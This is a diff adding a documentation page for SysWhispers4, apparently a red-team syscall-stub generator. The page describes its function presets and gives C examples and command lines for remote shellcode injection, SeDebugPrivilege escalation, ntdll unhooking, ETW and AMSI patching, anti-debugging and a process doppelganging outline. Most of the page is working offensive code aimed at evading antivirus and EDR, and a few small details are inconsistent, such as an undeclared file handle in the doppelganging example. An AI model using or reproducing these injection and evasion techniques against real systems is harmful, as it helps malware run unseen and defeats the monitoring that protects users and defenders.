@@ -1,0 +1,693 @@
+---
+title: 'Presets Reference'
+description: 'Complete documentation of all SysWhispers4 function presets and their use cases'
+icon: 'list'
+---
+
+## Overview
+
+SysWhispers4 provides 8 function presets that group commonly-used NT functions for specific offensive security tasks. Each preset is optimized for a particular technique or workflow.
+
+## Available Presets
+
+| Preset | Functions | Primary Use Case |
+|--------|:---------:|-----------------|
+| `common` | 25 | General process/thread/memory operations |
+| `injection` | 20 | Process and shellcode injection |
+| `evasion` | 15 | AV/EDR evasion and detection bypass |
+| `token` | 6 | Token manipulation and privilege escalation |
+| `stealth` | 31 | Maximum evasion (injection + evasion + more) |
+| `file_ops` | 7 | File I/O via NT syscalls |
+| `transaction` | 7 | Process doppelganging / transactional NTFS |
+| `all` | 64 | Every supported function |
+
+## List All Presets
+
+```bash
+python syswhispers.py --list-presets
+```
+
+**Output:**
+```
+Available presets:
+  common         -- Common functions for process/thread/memory operations
+                 (25 functions: NtAllocateVirtualMemory, NtFreeVirtualMemory, NtWriteVirtualMemory, NtReadVirtualMemory...)
+  injection      -- Functions for process/shellcode injection (APC, thread, section)
+                 (20 functions: NtAllocateVirtualMemory, NtFreeVirtualMemory, NtWriteVirtualMemory, NtReadVirtualMemory...)
+  ...
+```
+
+---
+
+## Preset: `common`
+
+**Description:** General process/thread/memory operations — the recommended starting point.
+
+**Use cases:**
+- Memory allocation and manipulation
+- Thread creation and management
+- Process querying
+- General-purpose NT API operations
+
+**Generate:**
+```bash
+python syswhispers.py --preset common
+```
+
+### Included Functions (25)
+
+#### Memory Operations (6)
+- `NtAllocateVirtualMemory` — Allocate memory in process
+- `NtFreeVirtualMemory` — Free allocated memory
+- `NtWriteVirtualMemory` — Write to process memory
+- `NtReadVirtualMemory` — Read from process memory
+- `NtProtectVirtualMemory` — Change memory protection
+- `NtQueryVirtualMemory` — Query memory region information
+
+#### Thread Operations (7)
+- `NtCreateThreadEx` — Create thread in process
+- `NtOpenThread` — Open handle to thread
+- `NtSuspendThread` — Suspend thread execution
+- `NtResumeThread` — Resume suspended thread
+- `NtGetContextThread` — Get thread context (registers)
+- `NtSetContextThread` — Set thread context
+- `NtTerminateThread` — Terminate thread
+
+#### Process Operations (4)
+- `NtOpenProcess` — Open handle to process
+- `NtTerminateProcess` — Terminate process
+- `NtQueryInformationProcess` — Query process information
+- `NtSetInformationProcess` — Set process information
+
+#### Section/Mapping (3)
+- `NtCreateSection` — Create section object
+- `NtMapViewOfSection` — Map section into process
+- `NtUnmapViewOfSection` — Unmap section
+
+#### Synchronization (3)
+- `NtClose` — Close handle
+- `NtDuplicateObject` — Duplicate handle
+- `NtWaitForSingleObject` — Wait for object signal
+
+#### Miscellaneous (2)
+- `NtQuerySystemInformation` — Query system information
+- `NtDelayExecution` — Sleep/delay execution
+
+### Example Usage
+
+```c
+#include "SW4Syscalls.h"
+
+int main(void) {
+    SW4_Initialize();
+    
+    // Allocate memory
+    PVOID base = NULL;
+    SIZE_T size = 0x1000;
+    SW4_NtAllocateVirtualMemory(
+        GetCurrentProcess(), &base, 0, &size,
+        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
+    );
+    
+    // Write data
+    char data[] = "Hello";
+    SIZE_T written = 0;
+    SW4_NtWriteVirtualMemory(
+        GetCurrentProcess(), base, data,
+        sizeof(data), &written
+    );
+    
+    // Free memory
+    size = 0;
+    SW4_NtFreeVirtualMemory(
+        GetCurrentProcess(), &base, &size, MEM_RELEASE
+    );
+    
+    return 0;
+}
+```
+
+---
+
+## Preset: `injection`
+
+**Description:** Functions for process injection via threads, APC, and section mapping.
+
+**Use cases:**
+- Classic shellcode injection (VirtualAlloc → WriteProcessMemory → CreateRemoteThread pattern)
+- APC injection
+- Section-based injection (manual mapping)
+- Thread hijacking
+
+**Generate:**
+```bash
+python syswhispers.py --preset injection --method indirect
+```
+
+### Included Functions (20)
+
+#### Memory (5)
+- `NtAllocateVirtualMemory`
+- `NtFreeVirtualMemory`
+- `NtWriteVirtualMemory`
+- `NtReadVirtualMemory`
+- `NtProtectVirtualMemory`
+
+#### Thread (6)
+- `NtCreateThreadEx` — Create remote thread
+- `NtOpenThread`
+- `NtSuspendThread`
+- `NtResumeThread`
+- `NtGetContextThread`
+- `NtSetContextThread`
+
+#### Process (2)
+- `NtOpenProcess`
+
+#### Section/Mapping (3)
+- `NtCreateSection`
+- `NtMapViewOfSection`
+- `NtUnmapViewOfSection`
+
+#### APC Injection (4)
+- `NtQueueApcThread` — Queue user-mode APC
+- `NtQueueApcThreadEx` — Extended APC queuing
+- `NtAlertResumeThread` — Resume and alert thread (execute APC)
+- `NtTestAlert` — Test and execute pending APCs
+
+#### Handle (1)
+- `NtClose`
+
+### Example: Classic Injection
+
+```c
+#include "SW4Syscalls.h"
+
+int inject(DWORD pid, unsigned char* shellcode, size_t sc_len) {
+    SW4_Initialize();
+    
+    // 1. Open process
+    HANDLE hProcess = NULL;
+    OBJECT_ATTRIBUTES oa = { sizeof(OBJECT_ATTRIBUTES) };
+    CLIENT_ID cid = { (PVOID)(ULONG_PTR)pid, NULL };
+    
+    SW4_NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
+    
+    // 2. Allocate RWX memory
+    PVOID base = NULL;
+    SIZE_T size = sc_len;
+    SW4_NtAllocateVirtualMemory(
+        hProcess, &base, 0, &size,
+        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
+    );
+    
+    // 3. Write shellcode
+    SIZE_T written = 0;
+    SW4_NtWriteVirtualMemory(hProcess, base, shellcode, sc_len, &written);
+    
+    // 4. Change to RX
+    ULONG old = 0;
+    SW4_NtProtectVirtualMemory(hProcess, &base, &size, PAGE_EXECUTE_READ, &old);
+    
+    // 5. Create remote thread
+    HANDLE hThread = NULL;
+    SW4_NtCreateThreadEx(
+        &hThread, THREAD_ALL_ACCESS, NULL,
+        hProcess, base, NULL, 0, 0, 0, 0, NULL
+    );
+    
+    // 6. Wait and cleanup
+    SW4_NtWaitForSingleObject(hThread, FALSE, NULL);
+    SW4_NtClose(hThread);
+    SW4_NtClose(hProcess);
+    
+    return 0;
+}
+```
+
+---
+
+## Preset: `evasion`
+
+**Description:** Functions useful for AV/EDR evasion, process querying, and detection bypass.
+
+**Use cases:**
+- Querying process/thread information to detect EDR presence
+- Memory manipulation for evasion
+- Dynamic unhooking support
+- Anti-analysis techniques
+
+**Generate:**
+```bash
+python syswhispers.py --preset evasion --resolve recycled
+```
+
+### Included Functions (15)
+
+#### Process Querying (4)
+- `NtQueryInformationProcess` — Query process info (PEB, debug port, etc.)
+- `NtSetInformationProcess` — Set process info
+- `NtQueryInformationThread` — Query thread info
+- `NtSetInformationThread` — Set thread info
+
+#### System/Memory Querying (3)
+- `NtQuerySystemInformation` — Query system info (processes, modules)
+- `NtQueryVirtualMemory` — Query memory regions
+- `NtSetInformationVirtualMemory` — Set memory info
+
+#### Memory Protection (1)
+- `NtProtectVirtualMemory` — Change protection (for unhooking)
+
+#### Section/Mapping (3)
+- `NtOpenSection` — Open existing section (e.g., `\KnownDlls\ntdll.dll`)
+- `NtMapViewOfSection` — Map clean ntdll for unhooking
+- `NtUnmapViewOfSection` — Unmap section
+
+#### Handle Operations (2)
+- `NtDuplicateObject` — Duplicate handles
+- `NtClose`
+
+#### Process Control (2)
+- `NtOpenProcess`
+- `NtTerminateProcess` — Terminate detected EDR process
+- `NtFlushInstructionCache` — Flush I-cache after unhooking
+
+### Example: Detect Debugger
+
+```c
+#include "SW4Syscalls.h"
+
+BOOL is_debugged(void) {
+    SW4_Initialize();
+    
+    // Method 1: ProcessDebugPort
+    HANDLE hProcess = GetCurrentProcess();
+    DWORD_PTR debugPort = 0;
+    ULONG retLen = 0;
+    
+    NTSTATUS st = SW4_NtQueryInformationProcess(
+        hProcess,
+        7,  // ProcessDebugPort
+        &debugPort,
+        sizeof(debugPort),
+        &retLen
+    );
+    
+    if (NT_SUCCESS(st) && debugPort != 0) {
+        return TRUE;  // Debugger detected
+    }
+    
+    return FALSE;
+}
+```
+
+---
+
+## Preset: `token`
+
+**Description:** Token manipulation functions for privilege escalation and impersonation.
+
+**Use cases:**
+- Token duplication
+- Privilege escalation (SeDebugPrivilege, etc.)
+- Thread impersonation
+- Token querying
+
+**Generate:**
+```bash
+python syswhispers.py --preset token
+```
+
+### Included Functions (6)
+
+- `NtOpenProcessToken` — Open process token
+- `NtOpenThreadToken` — Open thread token
+- `NtQueryInformationToken` — Query token information
+- `NtAdjustPrivilegesToken` — Enable/disable privileges
+- `NtDuplicateToken` — Duplicate token
+- `NtImpersonateThread` — Impersonate thread's security context
+
+### Example: Enable SeDebugPrivilege
+
+```c
+#include "SW4Syscalls.h"
+
+BOOL enable_debug_privilege(void) {
+    SW4_Initialize();
+    
+    HANDLE hToken = NULL;
+    NTSTATUS st = SW4_NtOpenProcessToken(
+        GetCurrentProcess(),
+        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
+        &hToken
+    );
+    
+    if (!NT_SUCCESS(st)) return FALSE;
+    
+    // SeDebugPrivilege = 20
+    TOKEN_PRIVILEGES tp;
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Luid.LowPart = 20;
+    tp.Privileges[0].Luid.HighPart = 0;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+    
+    st = SW4_NtAdjustPrivilegesToken(
+        hToken, FALSE, &tp, sizeof(tp), NULL, NULL
+    );
+    
+    SW4_NtClose(hToken);
+    return NT_SUCCESS(st);
+}
+```
+
+---
+
+## Preset: `stealth`
+
+**Description:** Maximum evasion — combines injection, evasion, and unhooking support functions.
+
+**Use cases:**
+- Red team operations requiring maximum stealth
+- Advanced malware analysis evasion
+- Combined injection + evasion workflows
+
+**Generate:**
+```bash
+python syswhispers.py --preset stealth \
+    --method randomized --resolve recycled \
+    --obfuscate --encrypt-ssn --unhook-ntdll \
+    --etw-bypass --amsi-bypass --anti-debug
+```
+
+### Included Functions (31)
+
+Combines:
+- All `injection` preset functions
+- All `evasion` preset functions
+- Additional helper functions:
+  - `NtContinue` — Exception handling
+  - `NtDelayExecution` — Sleep
+  - `NtWaitForSingleObject` — Synchronization
+
+### Example: Maximum Stealth Workflow
+
+```c
+#include "SW4Syscalls.h"
+
+int stealth_main(void) {
+    // 1. Unhook ntdll FIRST
+    SW4_UnhookNtdll();
+    
+    // 2. Initialize
+    if (!SW4_Initialize()) return 1;
+    
+    // 3. Bypass monitoring
+    SW4_PatchEtw();
+    SW4_PatchAmsi();
+    
+    // 4. Check for debuggers
+    if (!SW4_AntiDebugCheck()) {
+        // Detected — exit
+        return 0;
+    }
+    
+    // 5. Perform injection
+    // ... (use injection functions)
+    
+    // 6. Sleep with encryption
+    SW4_SleepEncrypt(5000);
+    
+    return 0;
+}
+```
+
+---
+
+## Preset: `file_ops`
+
+**Description:** File I/O operations via NT syscalls.
+
+**Use cases:**
+- Reading/writing files without Win32 API
+- Bypassing file access hooks
+- Low-level file manipulation
+
+**Generate:**
+```bash
+python syswhispers.py --preset file_ops
+```
+
+### Included Functions (7)
+
+- `NtCreateFile` — Create or open file
+- `NtOpenFile` — Open existing file
+- `NtWriteFile` — Write to file
+- `NtReadFile` — Read from file
+- `NtDeleteFile` — Delete file
+- `NtQueryObject` — Query object information
+- `NtClose` — Close handle
+
+### Example: Write File via Syscall
+
+```c
+#include "SW4Syscalls.h"
+
+int write_file_syscall(const char* path, const void* data, size_t len) {
+    SW4_Initialize();
+    
+    // Convert path to UNICODE_STRING
+    WCHAR wpath[MAX_PATH];
+    MultiByteToWideChar(CP_ACP, 0, path, -1, wpath, MAX_PATH);
+    
+    UNICODE_STRING uPath;
+    RtlInitUnicodeString(&uPath, wpath);
+    
+    OBJECT_ATTRIBUTES oa;
+    InitializeObjectAttributes(&oa, &uPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
+    
+    // Create file
+    HANDLE hFile = NULL;
+    IO_STATUS_BLOCK iosb = {0};
+    
+    NTSTATUS st = SW4_NtCreateFile(
+        &hFile,
+        FILE_GENERIC_WRITE,
+        &oa,
+        &iosb,
+        NULL,
+        FILE_ATTRIBUTE_NORMAL,
+        0,
+        FILE_OVERWRITE_IF,
+        FILE_SYNCHRONOUS_IO_NONALERT,
+        NULL,
+        0
+    );
+    
+    if (!NT_SUCCESS(st)) return 1;
+    
+    // Write data
+    st = SW4_NtWriteFile(hFile, NULL, NULL, NULL, &iosb, (PVOID)data, len, NULL, NULL);
+    
+    SW4_NtClose(hFile);
+    return NT_SUCCESS(st) ? 0 : 1;
+}
+```
+
+---
+
+## Preset: `transaction`
+
+**Description:** Transactional NTFS functions for process doppelganging and hollowing.
+
+**Use cases:**
+- Process doppelganging (create process from transacted file)
+- Transactional file operations (rollback on failure)
+- Advanced process creation evasion
+
+**Generate:**
+```bash
+python syswhispers.py --preset transaction --method indirect
+```
+
+### Included Functions (7)
+
+#### Transaction (3)
+- `NtCreateTransaction` — Create TxF transaction
+- `NtRollbackTransaction` — Rollback transaction
+- `NtCommitTransaction` — Commit transaction
+
+#### Process Creation (3)
+- `NtCreateSection` — Create section from transacted file
+- `NtCreateProcessEx` — Create process from section
+- `NtCreateThreadEx` — Create initial thread
+
+#### Handle (1)
+- `NtClose`
+
+### Example: Process Doppelganging Flow
+
+```c
+// Simplified process doppelganging outline
+// (Full implementation requires additional Win32 API calls)
+
+#include "SW4Syscalls.h"
+
+int dopplegang(const char* targetExe, unsigned char* payload, size_t payloadSize) {
+    SW4_Initialize();
+    
+    // 1. Create transaction
+    HANDLE hTransaction = NULL;
+    NTSTATUS st = SW4_NtCreateTransaction(
+        &hTransaction,
+        TRANSACTION_ALL_ACCESS,
+        NULL, NULL, NULL, 0, 0, 0, NULL, NULL
+    );
+    
+    // 2. Create/overwrite file in transaction
+    // (Use NtCreateFile with transaction handle)
+    
+    // 3. Write payload to transacted file
+    // (Use NtWriteFile)
+    
+    // 4. Create section from transacted file
+    HANDLE hSection = NULL;
+    st = SW4_NtCreateSection(
+        &hSection,
+        SECTION_ALL_ACCESS,
+        NULL,
+        NULL,
+        PAGE_READONLY,
+        SEC_IMAGE,
+        hTransactedFile
+    );
+    
+    // 5. Rollback transaction (file never committed to disk!)
+    SW4_NtRollbackTransaction(hTransaction, TRUE);
+    SW4_NtClose(hTransaction);
+    
+    // 6. Create process from section
+    HANDLE hProcess = NULL;
+    st = SW4_NtCreateProcessEx(
+        &hProcess,
+        PROCESS_ALL_ACCESS,
+        NULL,
+        GetCurrentProcess(),
+        0,
+        hSection,
+        NULL, NULL, 0
+    );
+    
+    // 7. Create thread
+    // (Use NtCreateThreadEx)
+    
+    // Cleanup
+    SW4_NtClose(hSection);
+    SW4_NtClose(hProcess);
+    
+    return 0;
+}
+```
+
+---
+
+## Preset: `all`
+
+**Description:** All 64 supported functions.
+
+**Use cases:**
+- Maximum flexibility
+- Framework development
+- Complete NT API syscall coverage
+
+**Generate:**
+```bash
+python syswhispers.py --preset all
+```
+
+### Included Functions (64)
+
+All functions from all presets, plus:
+- `NtAllocateVirtualMemoryEx` — Extended allocation
+- `NtSuspendProcess` / `NtResumeProcess` — Process suspension
+- `NtWaitForMultipleObjects` — Wait for multiple objects
+- `NtSignalAndWaitForSingleObject` — Atomic signal+wait
+- `NtCreateEvent` / `NtSetEvent` / `NtResetEvent` — Event objects
+- `NtCreateTimer` / `NtSetTimer` — Timer objects
+- `NtAlertThread` — Alert thread
+- And more...
+
+**Binary size:** Larger due to all 64 function stubs.
+
+---
+
+## Combining Presets
+
+Merge multiple presets:
+
+```bash
+python syswhispers.py --preset common,token
+```
+
+This includes:
+- All 25 `common` functions
+- All 6 `token` functions
+- Duplicates automatically removed
+
+---
+
+## Adding Custom Functions
+
+Combine preset with specific functions:
+
+```bash
+python syswhispers.py \
+    --preset injection \
+    --functions NtQuerySystemInformation,NtDelayExecution
+```
+
+Result: All `injection` functions + the 2 additional functions.
+
+---
+
+## Recommended Combinations
+
+### Red Team Shellcode Injection
+```bash
+python syswhispers.py --preset injection \
+    --method randomized --resolve freshycalls \
+    --obfuscate --encrypt-ssn
+```
+
+### Token Abuse + Evasion
+```bash
+python syswhispers.py --preset token,evasion \
+    --method indirect --resolve tartarus
+```
+
+### File Operations + Anti-Debug
+```bash
+python syswhispers.py --preset file_ops \
+    --anti-debug --etw-bypass
+```
+
+### Maximum Stealth Everything
+```bash
+python syswhispers.py --preset stealth \
+    --method randomized --resolve recycled \
+    --obfuscate --encrypt-ssn --stack-spoof \
+    --etw-bypass --amsi-bypass --unhook-ntdll \
+    --anti-debug --sleep-encrypt
+```
+
+---
+
+## Next Steps
+
+<CardGroup cols={2}>
+  <Card title="Basic Usage" icon="play" href="/guides/basic-usage">
+    Learn basic workflows and patterns
+  </Card>
+  <Card title="Advanced Evasion" icon="shield-halved" href="/guides/advanced-evasion">
+    Explore all evasion configurations
+  </Card>
+</CardGroup>
